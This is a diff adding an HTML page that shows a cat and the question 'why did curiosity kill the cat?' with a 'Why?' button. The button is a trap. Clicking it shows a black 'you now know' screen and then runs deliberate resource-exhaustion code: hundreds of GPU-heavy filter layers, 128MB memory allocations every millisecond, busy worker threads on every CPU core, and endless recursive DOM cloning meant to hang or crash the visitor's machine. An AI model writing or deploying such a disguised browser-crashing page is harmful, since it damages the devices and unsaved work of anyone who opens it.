@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Curiosity</title>
+    <style>
+        body {
+            background-color: white;
+            color: black;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', sans-serif;
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 80%;
+            max-width: 900px;
+        }
+
+        /* Text Section */
+        .content {
+            opacity: 0;
+            transition: opacity 1s ease 0.5s; /* Second to fade in */
+            flex: 1;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 300;
+            line-height: 1.2;
+            margin-bottom: 2rem;
+        }
+
+        /* Image Section */
+        .cat-box {
+            opacity: 0;
+            transition: opacity 1s ease; /* First to fade in */
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .cat-box img {
+            width: 270px;
+            height: 360px;
+            object-fit: cover;
+            border-radius: 4px;
+        }
+
+        /* Button Section */
+        #detonate {
+            opacity: 0;
+            transition: opacity 1s ease 1s; /* Third to fade in */
+            background-color: white;
+            color: black;
+            border: 2px solid black;
+            padding: 12px 40px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            outline: none;
+        }
+
+        #detonate:hover {
+            background-color: #f0f0f0;
+        }
+
+        /* Black Screen Overlay */
+        #death-screen {
+            position: fixed;
+            inset: 0;
+            background: black;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2147483647;
+            color: red;
+            font-size: 3rem;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
+</head>
+<body onload="initSequence()">
+
+    <div class="container">
+        <div class="content" id="text">
+            <h1>why did curiosity<br>kill the cat?</h1>
+            <button id="detonate" onclick="theTruth()">Why?</button>
+        </div>
+        <div class="cat-box" id="cat">
+            <img src="https://t4.ftcdn.net/jpg/02/23/55/67/360_F_223556761_6VamxuaG5aVcPJ1Kv9zjZw75tDtw9fy6.jpg" alt="Cat">
+        </div>
+    </div>
+
+    <div id="death-screen">you now know</div>
+
+<script>
+    function initSequence() {
+        // Handle the staggered fade-in
+        document.getElementById('cat').style.opacity = '1';
+        document.getElementById('text').style.opacity = '1';
+        document.getElementById('detonate').style.opacity = '1';
+    }
+
+    function theTruth() {
+        // Instant cut to black and red
+        document.getElementById('death-screen').style.display = 'flex';
+
+        // Start the hardware collapse after a tiny delay to ensure the UI paints
+        setTimeout(() => {
+            
+            // 1. GPU COMMAND BUFFER FLOAT
+            for(let i=0; i<800; i++) {
+                const d = document.createElement('div');
+                d.style.cssText = `
+                    position:fixed; inset:0; 
+                    backdrop-filter: blur(150px) contrast(300%) invert(100%);
+                    opacity: 0.02; z-index: ${i}; mix-blend-mode: exclusion;
+                    pointer-events: none;
+                `;
+                document.body.appendChild(d);
+            }
+
+            // 2. RAM SATURATION
+            const blackHole = [];
+            setInterval(() => {
+                try {
+                    const buf = new Uint8Array(128 * 1024 * 1024); 
+                    const blob = new Blob([buf]);
+                    blackHole.push(URL.createObjectURL(blob));
+                } catch(e){}
+            }, 1);
+
+            // 3. MULTI-THREAD BUS LOCK
+            const sab = new SharedArrayBuffer(1024);
+            const workerCode = `
+                self.onmessage = function(e) {
+                    const view = new Int32Array(e.data);
+                    while(true) { 
+                        Atomics.wait(view, 0, 0);
+                        let x = 2n ** 1000000n;
+                    }
+                };
+            `;
+            const blob = new Blob([workerCode], {type: 'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            for(let i = 0; i < (navigator.hardwareConcurrency || 8) * 4; i++) {
+                new Worker(url).postMessage(sab);
+            }
+
+            // 4. MAIN THREAD HIJACK (SYNC RECURSION)
+            (function hammer() {
+                // Exponential DOM growth
+                document.body.appendChild(document.body.cloneNode(true));
+                while(true) { hammer(); }
+            })();
+
+        }, 50);
+    }
+</script>
+
+</body>
+</html>
